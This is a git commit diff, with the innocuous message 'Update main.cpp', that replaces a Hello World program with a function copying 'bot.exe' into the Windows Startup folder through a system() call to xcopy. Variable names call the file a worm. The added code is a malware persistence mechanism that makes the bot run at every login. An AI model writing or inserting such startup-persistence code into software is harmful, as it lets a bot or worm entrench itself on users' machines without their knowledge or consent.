81b8ccbbf6e9bf5a2281e67c7482e2dc99edb88f
われ <74850252+ware255@users.noreply.github.com>
2022-09-06 00:50:22 +0900

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -1,6 +1,17 @@
 #include <iostream>
+#include <Windows.h>
+
+inline void saveStartup()
+{
+    std::string startup_directory       =  "\"%HOMEDRIVE%%HOMEPATH%\\Start Menu\\Programs\\Startup";
+    std::string dir_place_worm          =  startup_directory + "\\bot.exe";
+    std::string cmd_copy_worm_startup   =  "xcopy \".\\bot.exe\" " + dir_place_worm + "*\" /Y";
+    const char *cmd_copy_worm_startup_p =  cmd_copy_worm_startup.c_str();
+    
+    system(cmd_copy_worm_startup_p);
+}
 
 int main() {
-    printf("Hello, World!\n");
+    saveStartup();
     return 0;
 }
